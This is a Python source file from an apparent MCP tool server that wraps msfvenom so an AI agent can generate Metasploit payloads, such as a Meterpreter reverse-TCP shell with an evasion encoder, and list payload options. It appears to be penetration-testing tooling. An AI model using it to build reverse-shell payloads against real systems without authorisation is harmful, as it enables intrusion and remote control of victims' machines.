# ShikariMCP — Payload Crafting Tools

import shlex
from shikari.tools._base import shikari_tool, ToolScope
from shikari.core.executor import execute_command

@shikari_tool(
    name="msfvenom_generate",
    category="payload_generation",
    scope=ToolScope.LOCAL,
    binary="msfvenom",
    description="Generate standalone payloads with msfvenom."
)
async def msfvenom_generate(
    payload: str,
    lhost: str,
    lport: int,
    format: str,
    output_file: str,
    extra_args: str = ""
) -> str:
    """
    Generate Metasploit payloads.
    
    Args:
        payload: Metasploit payload (e.g., 'windows/x64/meterpreter/reverse_tcp')
        lhost: Local host / IP for reverse shell
        lport: Local port for reverse shell
        format: Output format (e.g., 'exe', 'elf', 'raw', 'c')
        output_file: Output file path
        extra_args: Additional flags like '--arch', '--platform', '-e x86/shikata_ga_nai'
    """
    cmd = [
        "msfvenom",
        "-p", payload,
        f"LHOST={lhost}",
        f"LPORT={lport}",
        "-f", format,
        "-o", output_file
    ]
    if extra_args:
        cmd.extend(shlex.split(extra_args))
    result = await execute_command(cmd, timeout=300)
    return result.output

@shikari_tool(
    name="msfvenom_list",
    category="payload_generation",
    scope=ToolScope.LOCAL,
    binary="msfvenom",
    description="List available payloads, encoders, nops, platforms, archs in msfvenom."
)
async def msfvenom_list(list_type: str) -> str:
    """
    List available options in msfvenom.
    
    Args:
        list_type: What to list: 'payloads', 'encoders', 'nops', 'platforms', 'archs', 'all'
    """
    cmd = ["msfvenom", "-l", list_type]
    result = await execute_command(cmd, timeout=120)
    return result.output
